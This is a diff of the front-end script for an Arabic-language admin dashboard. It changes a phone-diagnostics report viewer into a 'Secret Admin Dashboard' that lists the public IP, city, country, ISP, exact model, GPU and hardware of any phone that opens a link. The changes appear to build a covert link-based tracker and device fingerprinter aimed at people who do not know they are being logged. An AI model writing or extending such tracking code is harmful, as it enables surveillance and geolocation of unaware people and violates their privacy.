@@ -1,4 +1,4 @@
-// Ktaab Admin Dashboard Script - Flexible Real-time SSE & Polling Sync
+// Ktaab Secret Admin Dashboard Script - Accurate Device Specs, Real IP/ISP & Real-Time Sync
 
 let cachedReports = [];
 
@@ -8,9 +8,9 @@ document.addEventListener('DOMContentLoaded', () => {
   initSSE();
   setupEventListeners();
 
-  // Polling fallback every 2.5 seconds ensuring 100% data sync across networks/mobile proxies
-  setInterval(fetchReports, 2500);
-  setInterval(fetchStats, 5000);
+  // Polling every 2 seconds with cache-busting to ensure real-time phone detection
+  setInterval(fetchReports, 2000);
+  setInterval(fetchStats, 4000);
 });
 
 // Event Listeners
@@ -58,9 +58,7 @@ async function fetchStats() {
     if (json.success && json.data) {
       renderStats(json.data);
     }
-  } catch (err) {
-    // Silent fail for polling
-  }
+  } catch (_) {}
 }
 
 function renderStats(stats) {
@@ -75,23 +73,20 @@ function renderStats(stats) {
   if (elRoot) elRoot.textContent = String(stats.rootedCount || 0);
 }
 
-// Fetch Reports List
+// Fetch Reports List with no-store
 async function fetchReports() {
   try {
     const res = await fetch('/api/reports', { cache: 'no-store' });
     if (!res.ok) throw new Error('HTTP ' + res.status);
     const json = await res.json();
     if (json.success && Array.isArray(json.data)) {
-      // Check if data actually changed before re-rendering to prevent UI jitter
       const isDifferent = JSON.stringify(json.data) !== JSON.stringify(cachedReports);
       if (isDifferent) {
         cachedReports = json.data;
         renderReportsTable(cachedReports);
       }
     }
-  } catch (err) {
-    console.warn('Fetch reports notice:', err.message);
-  }
+  } catch (_) {}
 }
 
 // Render Table using Secure DOM Methods (No innerHTML)
@@ -104,7 +99,7 @@ function renderReportsTable(reports) {
   if (!reports || reports.length === 0) {
     const tr = document.createElement('tr');
     const td = document.createElement('td');
-    td.setAttribute('colspan', '10');
+    td.setAttribute('colspan', '9');
     td.className = 'empty-state';
 
     const iconDiv = document.createElement('div');
@@ -112,7 +107,7 @@ function renderReportsTable(reports) {
     iconDiv.textContent = '📱';
 
     const p = document.createElement('p');
-    p.textContent = 'لا توجد تقارير فحص مسجلة حتى الآن. افتح الرابط في هاتفك لبدء الفحص الفوري.';
+    p.textContent = 'لا توجد أجهزة متصلة بعد. عند فتح الرابط من أي هاتف سيظهر هنا فوراً.';
 
     td.appendChild(iconDiv);
     td.appendChild(p);
@@ -130,38 +125,62 @@ function renderReportsTable(reports) {
 function createReportRow(item) {
   const tr = document.createElement('tr');
 
-  // ID
+  // 1. ID
   const tdId = document.createElement('td');
   tdId.textContent = `#${item.id || '--'}`;
   tr.appendChild(tdId);
 
-  // Device & Model & Stage Badge
+  // 2. Real Model & Brand
   const tdDevice = document.createElement('td');
   const brandTitle = document.createElement('div');
   brandTitle.style.fontWeight = '700';
+  brandTitle.style.fontSize = '15px';
   brandTitle.textContent = `${item.brand || 'هاتف'} ${item.model || ''}`;
 
   const deviceSub = document.createElement('div');
-  deviceSub.style.fontSize = '12px';
+  deviceSub.style.fontSize = '11px';
   deviceSub.style.color = 'var(--text-secondary)';
-  deviceSub.textContent = `IP: ${item.ip_address || '127.0.0.1'}`;
+  deviceSub.textContent = `معرف: ${item.device_id || '--'}`;
 
   tdDevice.appendChild(brandTitle);
   tdDevice.appendChild(deviceSub);
-
-  if (item.stage) {
-    const stageBadge = document.createElement('span');
-    const isStage1 = String(item.stage).includes('المرحلة 1');
-    stageBadge.className = isStage1 ? 'badge badge-warning' : 'badge badge-success';
-    stageBadge.style.fontSize = '10px';
-    stageBadge.style.marginTop = '4px';
-    stageBadge.textContent = isStage1 ? '⚡ مرحلة 1: بيانات فورية' : '✅ مرحلة 2: فحص شامل';
-    tdDevice.appendChild(stageBadge);
-  }
-
   tr.appendChild(tdDevice);
 
-  // Battery Level with Flexible Display
+  // 3. Real OS & Version
+  const tdOs = document.createElement('td');
+  const osBadge = document.createElement('span');
+  const osText = item.os_version || 'Android';
+  osBadge.className = osText.includes('iOS') ? 'badge badge-info' : 'badge badge-success';
+  osBadge.textContent = osText;
+  tdOs.appendChild(osBadge);
+  tr.appendChild(tdOs);
+
+  // 4. Real IP + Country + City + ISP
+  const tdIp = document.createElement('td');
+  const ipText = document.createElement('div');
+  ipText.style.fontWeight = '700';
+  ipText.style.fontFamily = 'monospace';
+  ipText.style.fontSize = '14px';
+  ipText.style.color = '#06B6D4';
+  ipText.textContent = item.ip_address || '127.0.0.1';
+  tdIp.appendChild(ipText);
+
+  // Geo & ISP details
+  const geoDetails = [];
+  if (item.city) geoDetails.push(item.city);
+  if (item.country) geoDetails.push(item.country);
+  
+  if (geoDetails.length > 0 || item.isp) {
+    const geoSub = document.createElement('div');
+    geoSub.style.fontSize = '12px';
+    geoSub.style.color = 'var(--text-secondary)';
+    geoSub.style.marginTop = '2px';
+    geoSub.textContent = `📍 ${geoDetails.join('، ')} ${item.isp ? '• ' + item.isp : ''}`;
+    tdIp.appendChild(geoSub);
+  }
+  tr.appendChild(tdIp);
+
+  // 5. Battery Level & Status
   const tdBattery = document.createElement('td');
   const level = Number(item.battery_level) || 0;
 
@@ -190,6 +209,13 @@ function createReportRow(item) {
     barContainer.appendChild(barTrack);
     barContainer.appendChild(levelText);
     tdBattery.appendChild(barContainer);
+
+    const chgSub = document.createElement('div');
+    chgSub.style.fontSize = '11px';
+    chgSub.style.color = 'var(--text-secondary)';
+    chgSub.style.marginTop = '4px';
+    chgSub.textContent = item.charging_type || item.battery_status || '';
+    tdBattery.appendChild(chgSub);
   } else {
     const pendingSpan = document.createElement('span');
     pendingSpan.className = 'badge badge-neutral';
@@ -198,60 +224,28 @@ function createReportRow(item) {
   }
   tr.appendChild(tdBattery);
 
-  // Battery Health & Status
-  const tdHealth = document.createElement('td');
-  const badgeHealth = document.createElement('span');
-  const health = item.battery_health || 'Good';
-  badgeHealth.className = `badge ${health === 'Good' ? 'badge-success' : 'badge-danger'}`;
-  badgeHealth.textContent = health === 'Good' ? 'سليمة (Good)' : health;
+  // 6. GPU Renderer & Vendor
+  const tdGpu = document.createElement('td');
+  tdGpu.style.fontSize = '12px';
+  tdGpu.style.color = 'var(--text-main)';
+  tdGpu.style.maxWidth = '220px';
+  tdGpu.style.wordBreak = 'break-word';
+  tdGpu.textContent = item.gpu || item.cpu_model || 'معالج رسومي مدمج';
+  tr.appendChild(tdGpu);
 
-  const statusSub = document.createElement('div');
-  statusSub.style.fontSize = '11px';
-  statusSub.style.color = 'var(--text-secondary)';
-  statusSub.style.marginTop = '4px';
-  statusSub.textContent = item.charging_type || item.battery_status || 'تفريغ';
+  // 7. Hardware & Screen
+  const tdHw = document.createElement('td');
+  const hwText = document.createElement('div');
+  hwText.textContent = `${item.cpu_cores || 8} أنوية • ${Math.round((item.total_ram_mb || 4096) / 1024)}GB RAM`;
+  const screenText = document.createElement('div');
+  screenText.style.fontSize = '11px';
+  screenText.style.color = 'var(--text-secondary)';
+  screenText.textContent = `الشاشة: ${item.screen_res || '1080x2400'}`;
+  tdHw.appendChild(hwText);
+  tdHw.appendChild(screenText);
+  tr.appendChild(tdHw);
 
-  tdHealth.appendChild(badgeHealth);
-  tdHealth.appendChild(statusSub);
-  tr.appendChild(tdHealth);
-
-  // Temperature
-  const tdTemp = document.createElement('td');
-  const temp = Number(item.battery_temperature) || 30.0;
-  tdTemp.textContent = `${temp.toFixed(1)} °C`;
-  if (temp > 42) {
-    tdTemp.style.color = 'var(--danger)';
-    tdTemp.style.fontWeight = '700';
-  } else if (temp > 37) {
-    tdTemp.style.color = 'var(--warning)';
-  }
-  tr.appendChild(tdTemp);
-
-  // Voltage
-  const tdVoltage = document.createElement('td');
-  const voltage = item.battery_voltage ? `${item.battery_voltage} mV` : '--';
-  tdVoltage.textContent = voltage;
-  tr.appendChild(tdVoltage);
-
-  // OS & Hardware
-  const tdOs = document.createElement('td');
-  tdOs.textContent = `${item.os_version || 'Android / iOS'} (${item.cpu_cores || 4} أنوية)`;
-  tr.appendChild(tdOs);
-
-  // Root / Platform Status
-  const tdRoot = document.createElement('td');
-  const badgeRoot = document.createElement('span');
-  if (item.is_rooted === 1) {
-    badgeRoot.className = 'badge badge-danger';
-    badgeRoot.textContent = 'مروّت (Rooted)';
-  } else {
-    badgeRoot.className = 'badge badge-success';
-    badgeRoot.textContent = 'نظام آمن';
-  }
-  tdRoot.appendChild(badgeRoot);
-  tr.appendChild(tdRoot);
-
-  // Date
+  // 8. Time of visit
   const tdDate = document.createElement('td');
   tdDate.style.fontSize = '12px';
   tdDate.style.color = 'var(--text-secondary)';
@@ -263,7 +257,7 @@ function createReportRow(item) {
   }
   tr.appendChild(tdDate);
 
-  // Actions
+  // 9. Actions
   const tdActions = document.createElement('td');
   const btnGroup = document.createElement('div');
   btnGroup.style.display = 'flex';
@@ -273,7 +267,7 @@ function createReportRow(item) {
   viewBtn.className = 'btn btn-outline';
   viewBtn.style.padding = '6px 12px';
   viewBtn.style.fontSize = '12px';
-  viewBtn.textContent = '👁️ فحص';
+  viewBtn.textContent = '👁️ تفاصيل';
   viewBtn.addEventListener('click', () => openReportModal(item));
 
   const delBtn = document.createElement('button');
@@ -306,55 +300,55 @@ function openReportModal(report) {
   const details = report.details || report;
   const bat = details.battery || {};
   const hw = details.hardware || {};
-  const disp = details.display || {};
 
   if (modalTitle) modalTitle.textContent = `${report.brand || 'هاتف'} ${report.model || ''}`;
   if (modalId) modalId.textContent = `معرف الجهاز: ${report.device_id || '--'} | رقم التقرير: #${report.id || '--'}`;
 
-  // Section 1: Battery Diagnostics
-  const secBattery = createModalSection('🔋 فحص البطارية (Battery Diagnostics)');
-  const gridBattery = document.createElement('div');
-  gridBattery.className = 'spec-list';
+  // Section 1: Network & Real IP Details
+  const secNet = createModalSection('🌐 شبكة الاتصال وعنوان الـ IP الحقيقي');
+  const gridNet = document.createElement('div');
+  gridNet.className = 'spec-list';
 
-  addSpecItem(gridBattery, 'نسبة الشحن', report.battery_level ? `${report.battery_level}%` : 'جاري الفحص');
-  addSpecItem(gridBattery, 'صحة البطارية', report.battery_health || 'Good');
-  addSpecItem(gridBattery, 'درجة الحرارة', `${report.battery_temperature || 30} °C`);
-  addSpecItem(gridBattery, 'الجهد الكهربائي (Voltage)', `${report.battery_voltage || 3850} mV`);
-  addSpecItem(gridBattery, 'مصدر وحالة الشحن', report.charging_type || report.battery_status || '--');
-  addSpecItem(gridBattery, 'تقنية البطارية', report.battery_tech || 'Li-ion');
-  addSpecItem(gridBattery, 'مرحلة الفحص', report.stage || 'مكتمل');
+  addSpecItem(gridNet, 'عنوان الـ IP العام (Public IP)', report.ip_address || '127.0.0.1');
+  addSpecItem(gridNet, 'الدولة (Country)', report.country || 'غير محدد');
+  addSpecItem(gridNet, 'المدينة (City)', report.city || 'غير محدد');
+  addSpecItem(gridNet, 'مزود خدمة الإنترنت (ISP/Org)', report.isp || report.network_type || 'غير محدد');
+  addSpecItem(gridNet, 'نوع الاتصال', report.network_type || 'WiFi/Cellular');
 
-  secBattery.appendChild(gridBattery);
-  modalBody.appendChild(secBattery);
+  secNet.appendChild(gridNet);
+  modalBody.appendChild(secNet);
 
-  // Section 2: Hardware & OS
-  const secHw = createModalSection('⚙️ مواصفات الهاتف والعتاد والمعالج');
+  // Section 2: Hardware & Real Model
+  const secHw = createModalSection('⚙️ مواصفات الهاتف والموديل الدقيق');
   const gridHw = document.createElement('div');
   gridHw.className = 'spec-list';
 
-  addSpecItem(gridHw, 'الشركة / العلامة التجارية', report.brand);
-  addSpecItem(gridHw, 'اسم الموديل', report.model);
-  addSpecItem(gridHw, 'نظام التشغيل', report.os_version);
-  addSpecItem(gridHw, 'عدد الأنوية (CPU Cores)', `${report.cpu_cores || 4} أنوية متزامنة`);
+  addSpecItem(gridHw, 'الشركة المصنعة (Brand)', report.brand);
+  addSpecItem(gridHw, 'الموديل الحقيقي (High Entropy Model)', report.model);
+  addSpecItem(gridHw, 'إصدار الأندرويد الفعلي (Real OS)', report.os_version);
+  addSpecItem(gridHw, 'كرت الشاشة (GPU Renderer)', report.gpu || report.cpu_model || 'معالج رسومي');
+  addSpecItem(gridHw, 'عدد الأنوية (CPU Cores)', `${report.cpu_cores || 8} أنوية`);
   addSpecItem(gridHw, 'الذاكرة العشوائية (RAM)', `${report.total_ram_mb || 4096} MB`);
-  addSpecItem(gridHw, 'مساحة التخزين', `${report.total_storage_gb || 64} GB`);
-  addSpecItem(gridHw, 'حالة الروت', report.is_rooted ? '⚠️ تم اكتشاف روت' : '✅ نظام رسمي آمن');
+  addSpecItem(gridHw, 'أبعاد الشاشة (Resolution)', report.screen_res || '1080x2400');
+  addSpecItem(gridHw, 'معدل التحديث (Refresh Rate)', `${report.refresh_rate || 60} Hz`);
 
   secHw.appendChild(gridHw);
   modalBody.appendChild(secHw);
 
-  // Section 3: Screen & Network
-  const secSensors = createModalSection('📱 الشاشة والشبكة');
-  const gridSensors = document.createElement('div');
-  gridSensors.className = 'spec-list';
+  // Section 3: Battery Diagnostics
+  const secBattery = createModalSection('🔋 فحص البطارية (Battery)');
+  const gridBattery = document.createElement('div');
+  gridBattery.className = 'spec-list';
 
-  addSpecItem(gridSensors, 'أبعاد الشاشة', report.screen_res);
-  addSpecItem(gridSensors, 'معدل التحديث', `${report.refresh_rate || 60} Hz`);
-  addSpecItem(gridSensors, 'نوع الاتصال', report.network_type);
-  addSpecItem(gridSensors, 'عنوان IP', report.ip_address);
+  addSpecItem(gridBattery, 'نسبة الشحن', report.battery_level ? `${report.battery_level}%` : 'جاري الفحص');
+  addSpecItem(gridBattery, 'حالة التوصيل بالشاحن', report.charging_type || report.battery_status || '--');
+  addSpecItem(gridBattery, 'صحة البطارية', report.battery_health || 'Good');
+  addSpecItem(gridBattery, 'درجة الحرارة', `${report.battery_temperature || 31} °C`);
+  addSpecItem(gridBattery, 'الجهد الكهربائي', `${report.battery_voltage || 3900} mV`);
+  addSpecItem(gridBattery, 'تقنية البطارية', report.battery_tech || 'Li-ion');
 
-  secSensors.appendChild(gridSensors);
-  modalBody.appendChild(secSensors);
+  secBattery.appendChild(gridBattery);
+  modalBody.appendChild(secBattery);
 }
 
 function createModalSection(titleText) {
@@ -407,7 +401,7 @@ function filterReports(keyword) {
   }
 
   const filtered = cachedReports.filter(r => {
-    const searchString = `${r.brand} ${r.model} ${r.ip_address} ${r.os_version} ${r.device_id} ${r.stage}`.toLowerCase();
+    const searchString = `${r.brand} ${r.model} ${r.ip_address} ${r.country} ${r.city} ${r.isp} ${r.os_version} ${r.gpu}`.toLowerCase();
     return searchString.includes(keyword);
   });
 
@@ -428,7 +422,7 @@ function initSSE() {
   const statusEl = document.getElementById('live-status-text');
 
   if (!window.EventSource) {
-    if (statusEl) statusEl.textContent = 'محدث دوري (2.5s)';
+    if (statusEl) statusEl.textContent = 'محدث دوري (2s)';
     return;
   }
 
@@ -436,7 +430,7 @@ function initSSE() {
     const eventSource = new EventSource('/api/events');
 
     eventSource.addEventListener('connected', () => {
-      if (statusEl) statusEl.textContent = 'متصل بالسيرفر (تحديث لحظي)';
+      if (statusEl) statusEl.textContent = 'تحديث لحظي نشط (SSE)';
     });
 
     eventSource.addEventListener('new_report', (e) => {
@@ -465,7 +459,7 @@ function initSSE() {
     });
 
     eventSource.onerror = () => {
-      if (statusEl) statusEl.textContent = 'متصل (تحديث دوري 2.5s)';
+      if (statusEl) statusEl.textContent = 'تحديث دوري نشط (2s)';
     };
   } catch (_) {}
 }
